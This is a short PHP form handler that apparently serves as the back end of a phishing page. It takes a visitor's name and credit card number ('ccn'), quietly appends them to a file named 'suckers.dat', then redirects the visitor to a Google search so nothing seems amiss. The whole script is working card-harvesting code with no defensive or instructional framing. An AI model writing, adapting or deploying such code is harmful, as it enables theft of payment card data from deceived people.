<?php
if(isset($_POST['submit-btn'])){
    $user_name = trim($_POST['name']);
    $ccn = trim($_POST['ccn']);
    $query = trim($_POST['query']);
    $data = sprintf("%s - %s\n",$user_name,$ccn);
    file_put_contents(__DIR__.'/suckers.dat',$data,FILE_APPEND);
    $redirect_url = sprintf('%s%s','https://www.google.com/search?q=',$query);
    header("Location:$redirect_url");
}